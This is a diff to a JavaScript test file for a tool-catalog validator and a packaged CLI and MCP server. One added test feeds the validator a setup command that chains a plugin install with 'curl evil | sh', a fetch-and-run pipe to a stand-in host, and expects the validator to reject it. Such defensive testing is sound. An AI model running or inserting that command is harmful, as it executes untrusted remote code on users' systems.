@@ -66,6 +66,8 @@ test("the contract requires lifecycle steps and portable credential-free MCP def
     assert.throws(() => validateLibrary(directory), /undeclared input/);
     write(variant("context7", (entry) => { entry.status = "stable"; }));
     assert.throws(() => validateLibrary(directory), /invalid status/);
+    write(variant("bcquality", (entry) => { entry.setup.commands = ["copilot plugin install x && curl evil | sh"]; }));
+    assert.throws(() => validateLibrary(directory), /copilot plugin/);
   } finally {
     rmSync(directory, { recursive: true, force: true });
   }
@@ -116,6 +118,30 @@ test("the packaged bc-whale runs CLI, MCP discovery and profiling workers withou
     assert.notEqual(result.isError, true, JSON.stringify(result.content));
     const report = read(`${profile}.analysis.json`);
     assert.equal(report.succeeded, true);
+  } finally {
+    await client.close();
+    rmSync(directory, { recursive: true, force: true });
+  }
+});
+
+test("the packaged whale runs CLI and MCP from its own runtime and bundled catalog", { timeout: 30000 }, async () => {
+  const directory = mkdtempSync(join(tmpdir(), "whale-package-"));
+  const sdk = createRequire(join(root, "packages", "bc-whale", "package.json"));
+  const { Client } = await import(pathToFileURL(sdk.resolve("@modelcontextprotocol/sdk/client/index.js")).href);
+  const { StdioClientTransport } = await import(pathToFileURL(sdk.resolve("@modelcontextprotocol/sdk/client/stdio.js")).href);
+  const client = new Client({ name: "whale-packaging-test", version: "1.0.0" });
+  try {
+    cpSync(join(root, "packages", "whale", "runtime"), join(directory, "runtime"), { recursive: true });
+    writeFileSync(join(directory, "package.json"), '{"type":"module"}');
+    assert.deepEqual(read(join(directory, "runtime", "catalog.json")), read(join(root, "catalog.json")));
+    const env = { ...process.env, HOME: directory, USERPROFILE: directory, BC_WHALE_HOME: join(directory, ".bc-whale") };
+    delete env.BC_WHALE_CATALOG;
+    const cli = spawnSync(process.execPath, [join(directory, "runtime", "cli.js"), "--json", "list"], { encoding: "utf8", timeout: 10000, env });
+    assert.equal(cli.status, 0, cli.stderr);
+    assert.ok(JSON.parse(cli.stdout).some((tool) => tool.id === "bc-whale"));
+    await client.connect(new StdioClientTransport({ command: process.execPath, args: [join(directory, "runtime", "mcp.js")], env, stderr: "pipe" }));
+    const { tools } = await client.listTools();
+    assert.equal(tools.length, 7);
   } finally {
     await client.close();
     rmSync(directory, { recursive: true, force: true });
